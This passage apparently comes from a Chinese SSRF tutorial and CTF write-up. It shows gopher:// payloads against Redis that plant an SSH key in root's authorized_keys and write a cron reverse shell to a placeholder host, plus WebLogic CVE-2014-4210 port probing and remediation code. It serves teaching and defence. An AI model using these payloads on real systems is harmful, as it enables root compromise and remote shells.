    gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$401%0d%0a%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU+RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
payload 解码为：
    gopher://127.0.0.1:6379/_*3
    $3
    set
    $1
    1
    $401
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/Xn7uoTwU RX1gYTBrmZlNwU2KUBICuxflTtFwfbZM3wAy/FmZmtpCf2UvZFb/MfC1i......2pyARF0YjMmjMevpQwjeN3DD3cw/bO4XMJC7KnUGil4ptcxmgTsz0UsdXAd9J2UdwPfmoM9
    *4
    $6
    config
    $3
    set
    $3
    dir
    $11
    /root/.ssh/
    *4
    $6
    config
    $3
    set
    $10
    dbfilename
    $15
    authorized_keys
    *1
    $4
    save
    *1
    $4
    quit
payload由joychou的反弹shell修改而来，主要就是替换了写入文件的位置和文件内容。然后修改文件的长度。
然后尝试登陆，输入创建密钥的密码后，登陆成功。
2）利用redis写定时任务来反弹shell
既然提到反弹shell，就需要利用一台外网主机。此处使用了nc做端口监听。
使用payload为以下：
    gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$61%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/x.x.x.x/2233 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
解码后的内容就是：
    gopher://127.0.0.1:6379/_*3
    $3
    set
    $1
    1
    $61
    */1 * * * * bash -i >& /dev/tcp/x.x.x.x/2233 0>&1
    *4
    $6
    config
    $3
    set
    $3
    dir
    $16
    /var/spool/cron/
    *4
    $6
    config
    $3
    set
    $10
    dbfilename
    $4
    root
    *1
    $4
    save
    *1
    $4
    quit
来自：
其中$61为我的vps地址，也就是`%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333
0>&1%0a%0a%0a%0a`的字符串长度。执行后稍等片刻就可以收到反弹的shell了。同时需要写入的命令前后要加几个回车。
根据前文的提示，打开/passwd文件就可以找到flag了。
在网站页面上输入这一串字符，就可以结束这场SSRF之旅了。
# 5\. CMS实战演示
## 5.1 漏洞环境
vulhub、weblogic、ssrf
## 5.2 漏洞介绍
CVE-2014-4210，weblogic的uddiexplorer.war存在安全组件漏洞，此漏洞可通过HTTP协议利用，未经身份验证的远程攻击者可利用此漏洞影响受影响组件的机密性。该漏洞的影响版本包括：10.0.2.0,
10.3.6.0
## 5.3 下载地址
下载vulhub后，进入对应的安装目录，执行`docker-compose up -d`,会自动创建docker镜像。
构建完成后访问如下地址：
    /uddiexplorer/SearchPublicRegistries.jsp
访问如下地址时返回，代表端口未开放：
    /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:80
    /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001
响应可以看到返回404，证明端口开放：
然后可以根据遍历查看开放的端口服务，在根据开放的服务来决定是否能不能执行内网攻击。而实际中越到的SSRF大都是探测类使用，因为能正好搭配使用的情况，而且还可以查看或者反弹的，概率值得讨论。
## 5.4 漏洞修复
### 5.4.1 删除server/lib/uddiexplorer.war下的相应jsp文件。
    jar -xvf uddiexplorer.war 
    rm jsp-files 
    jar -cvfM uddiexplorer.war uddiexplorer/
## 5.4.2 在官方的漏洞通报上找到补丁安装
# 6\. 漏洞修复
## 6.1 限制返回信息的，例如请求文件，只返回文件是否请求成功，没有请求成功到文件统一返回错误信息。
## 6.2 对请求地址设置白名单，只允许请求白名单内的地址。
## 6.3 禁用除http和https外的协议，如：file://，gopher://，dict://等
## 6.4 限制请求的端口为固定服务端口，如：80，443
## 6.5 Java类代码修复（来自joychou）
方法调用：
    String[] urlwhitelist = {"joychou.com", "joychou.me"};
    if (!UrlSecCheck(url, urlwhitelist)) {
        return;
    }
方法代码：
需要先添加guava库（目的是获取一级域名）
        com.google.guava
        guava
        21.0
    方法实现：
    public static Boolean UrlSecCheck(String url, String[] urlwhitelist) {
        try {
            URL u = new URL(url);
            // 只允许http和https的协议
            if (!u.getProtocol().startsWith("http") && !u.getProtocol().startsWith("https")) {
                return  false;
            }
            // 获取域名，并转为小写
            String host = u.getHost().toLowerCase();
            // 获取一级域名
            String rootDomain = InternetDomainName.from(host).topPrivateDomain().toString();
            for (String whiteurl: urlwhitelist){
                if (rootDomain.equals(whiteurl)) {
                    return true;
                }
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }